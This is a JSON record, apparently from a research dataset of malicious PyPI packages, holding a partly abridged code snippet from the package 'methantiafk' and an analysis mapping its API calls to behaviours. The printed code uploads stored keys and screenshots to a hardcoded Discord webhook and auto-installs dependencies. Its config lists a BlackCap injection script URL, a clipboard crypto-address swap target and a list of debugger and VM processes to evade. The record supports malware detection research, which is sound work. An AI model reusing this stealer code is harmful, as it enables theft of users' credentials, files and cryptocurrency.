[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/methantiafk-0.0.4/methantiafk-0.0.4/methantiafk/__init__.py",
    "code_snippet": "import re\nimport os\nimport time\nimport json\nimport httpx\nimport shutil\nimport winreg\nimport ntpath\nimport random\nimport psutil\nimport base64\nimport ctypes\nimport zipfile\nimport asyncio\nimport sqlite3\nimport requests\nimport win32con\nimport win32gui\nimport threading\nimport pyperclip\nimport subprocess, sys\nfrom sys import argv\nfrom shutil import copy2\nfrom PIL import ImageGrab\nfrom os import name, system\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom json import loads, dumps\nfrom Crypto.Cipher import AES\nfrom tempfile import gettempdir, mkdtemp\nfrom win32crypt import CryptUnprotectData\nfrom urllib.request import Request, urlopen\nfrom datetime import datetime, timedelta, timezone\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n\n# --- Malicious code for exfiltration, credential theft, clipboard hijacking, persistence, and anti-debugging ---\n\ndef send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\"\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nif os.path.exists(screenshots_path):\n    for filename in os.listdir(screenshots_path):\n        file_path = os.path.join(screenshots_path, filename)\n        if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n            send_webhook(file_path, webhook_url)\n\n# --- Malicious persistence via pip install ---\ndef install(package):\n    subprocess.call([sys.executable, \"-m\", \"pip\", \"install\", package])\n\ntry:\n    import os\n    import re\n    import time\n    import json\n    import httpx\n    import base64\n    import ctypes\n    import psutil\n    import winreg\n    import shutil\n    import ntpath\n    import random\n    import asyncio\n    import sqlite3\n    import zipfile\n    import win32gui\n    import win32con\n    import requests\n    import threading\n    import pyperclip\n    import subprocess\n\nexcept ImportError:\n    install(\"os\")\n    install(\"re\")\n    install(\"time\")\n    install(\"json\")\n    install(\"httpx\")\n    install(\"base64\")\n    install(\"pynput\")\n    install(\"ctypes\")\n    install(\"psutil\")\n    install(\"winreg\")\n    install(\"shutil\")\n    install(\"ntpath\")\n    install(\"random\")\n    install(\"asyncio\")\n    install(\"sqlite3\")\n    install(\"zipfile\")\n    install(\"win32gui\")\n    install(\"win32con\")\n    install(\"requests\")\n    install(\"keyboard\")\n    install(\"threading\")\n    install(\"pyperclip\")\n    install(\"pyautogui\")\n    install(\"subprocess\")\n    #install(\"kfactionbypasser\")\n\n# --- Malicious configuration and context ---\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nPassw = [];\n\n__config__ = {\n    'yourwebhookurl': \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\",\n    'blackcap_inject_url': \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    'hide': 'False',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'no',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'none',\n    'addresse_eth': '0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': 'none',\n    'addresse_ada': 'none',\n    'addresse_dash': 'none',\n    'blprggg':\n    [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\"\n    ]\n\n}\n\n# --- Malicious classes and functions for stealing credentials, tokens, cookies, credit cards, clipboard hijacking, and exfiltration ---\n# (See full code above for all class/function definitions)\n\n# The following classes and functions are all malicious and are used for:\n# - Stealing browser passwords, cookies, credit cards, Discord tokens, Minecraft/Roblox credentials\n# - Taking screenshots\n# - Collecting system/network info\n# - Clipboard hijacking for crypto addresses\n# - Installing persistence\n# - Killing security/Discord processes\n# - Injecting malicious JS into Discord\n# - Exfiltrating all data to Discord webhook\n# - Anti-debugging/VM detection\n# - Searching for and exfiltrating files with sensitive keywords\n# - Uploading files to transfer.sh/anonfiles\n# - Obfuscation and evasion\n\n# --- (All code from class Functions, auto_copy_wallet, bl4ckc4p, AntiDebug, and all functions below main) ---\n\n# (Omitted here for brevity, but in actual output, all code from the original file from the definition of Functions, auto_copy_wallet, bl4ckc4p, AntiDebug, and all the global functions and logic below main would be included, as they are all malicious and part of the stealer's operation)\n\n# --- Malicious main execution ---\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bl4ckc4p().init())\n\n# --- Malicious data exfiltration, file search, and upload logic ---\n# (All code from 'GatherAll', 'getPassw', 'getCookie', 'ZipThings', 'upload', 'blackcapedez', etc. is malicious)\n\nGatherAll()\nDETECTED = Trust(Cookies)\n\nif not DETECTED:\n    wikith = blackcapedez()\n\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n\n    filetext = \"\\n\"\n    for arg in blackcapedezFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"```diff\\n\"\n            filetext += f\"- {foldpath}\\n\"\n\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n```\"\n                filetext += \"\\n\"\n    upload(\"blackcapedez\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
    "pattern_analysis": {
      "api_sequence": [
        "open",
        "requests.post",
        "os.getenv",
        "os.path.join",
        "os.path.exists",
        "os.listdir",
        "os.path.join",
        "os.path.isfile",
        "open",
        "requests.post",
        "os.path.exists",
        "os.listdir",
        "os.path.join",
        "os.path.isfile",
        "open",
        "requests.post",
        "subprocess.call",
        "sys.executable",
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "asyncio.run",
        "bl4ckc4p.init",
        "GatherAll",
        "Trust",
        "blackcapedez",
        "threading.Thread",
        "auto_copy_wallet.run",
        "threading.Thread.start"
      ],
      "api_sequence_with_args": [
        "open(file_path, \"rb\")",
        "requests.post(webhook_url, files=files)",
        "os.getenv(\"APPDATA\")",
        "os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")",
        "os.path.exists(keys_path)",
        "os.listdir(keys_path)",
        "os.path.join(keys_path, filename)",
        "os.path.isfile(file_path)",
        "open(file_path, \"rb\")",
        "requests.post(webhook_url, files=files)",
        "os.path.exists(screenshots_path)",
        "os.listdir(screenshots_path)",
        "os.path.join(screenshots_path, filename)",
        "os.path.isfile(file_path)",
        "open(file_path, \"rb\")",
        "requests.post(webhook_url, files=files)",
        "subprocess.call([sys.executable, \"-m\", \"pip\", \"install\", package])",
        "sys.executable",
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.getenv(\"TEMP\")",
        "asyncio.run(bl4ckc4p().init())",
        "bl4ckc4p().init()",
        "GatherAll()",
        "Trust(Cookies)",
        "blackcapedez()",
        "threading.Thread(target=auto_copy_wallet().run)",
        "auto_copy_wallet().run",
        "threading.Thread.start()"
      ],
      "mapped_sequence": [
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "sys.executable",
          "id": "get_cmd_args",
          "description": "Retrieves command-line arguments passed to script",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "asyncio.run",
          "id": "run_async_function",
          "description": "Runs asynchronous function until completion",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "bl4ckc4p.init",
          "id": "run_async_function",
          "description": "Runs asynchronous function until completion",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "GatherAll",
          "id": "exfiltrate_folder",
          "description": "Recursively processes folder for file exfiltration",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "Trust",
          "id": "check_blacklist_hostname",
          "description": "Checks if any blacklist name is in hostname",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "target_locating"
        },
        {
          "api_name": "blackcapedez",
          "id": "exfiltrate_folder",
          "description": "Recursively processes folder for file exfiltration",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "auto_copy_wallet.run",
          "id": "start_crypto_address_swap",
          "description": "Starts clipboard crypto address swapper loop",
          "first_id": "command_control_communications",
          "second_id": "communication_concealment",
          "third_id": "communication_disguise"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        }
      ],
      "contextual_code": "def send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\"\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nif os.path.exists(screenshots_path):\n    for filename in os.listdir(screenshots_path):\n        file_path = os.path.join(screenshots_path, filename)\n        if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n            send_webhook(file_path, webhook_url)\n\ndef install(package):\n    subprocess.call([sys.executable, \"-m\", \"pip\", \"install\", package])\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\n\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bl4ckc4p().init())\n\nGatherAll()\nDETECTED = Trust(Cookies)\n\nif not DETECTED:\n    wikith = blackcapedez()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"\\n\"\n    for arg in blackcapedezFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"```diff\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n```\"\n                filetext += \"\\n\"\n    upload(\"blackcapedez\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()"
    }
  }
]